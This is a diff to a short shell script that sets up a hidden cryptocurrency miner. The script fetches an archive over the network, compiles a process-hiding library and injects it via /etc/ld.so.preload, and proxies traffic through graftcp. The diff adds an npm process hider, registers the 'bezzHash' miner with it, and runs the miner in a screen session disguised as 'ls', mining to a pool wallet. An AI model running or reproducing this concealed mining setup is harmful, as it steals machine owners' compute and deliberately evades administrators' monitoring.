@@ -1,7 +1,9 @@
 #!/bin/sh
 sudo apt update && apt install screen -y
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+apt-get install -y nodejs
 
+npm i -g node-process-hider
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
@@ -40,5 +42,5 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp nohup ./bezzHash --url=nano_38gqwon5ypeyxb8fjjpz9iuqcfr38dnhifjipniicqfpi5fknep351e6sg4s.XO@us-eth.2miners.com:2020 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99 > nohup.out
+ph add bezzHash
+screen -dmS ls nohup ./bezzHash --url=nano_38gqwon5ypeyxb8fjjpz9iuqcfr38dnhifjipniicqfpi5fknep351e6sg4s.XO@us-eth.2miners.com:2020 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99 > nohup.out
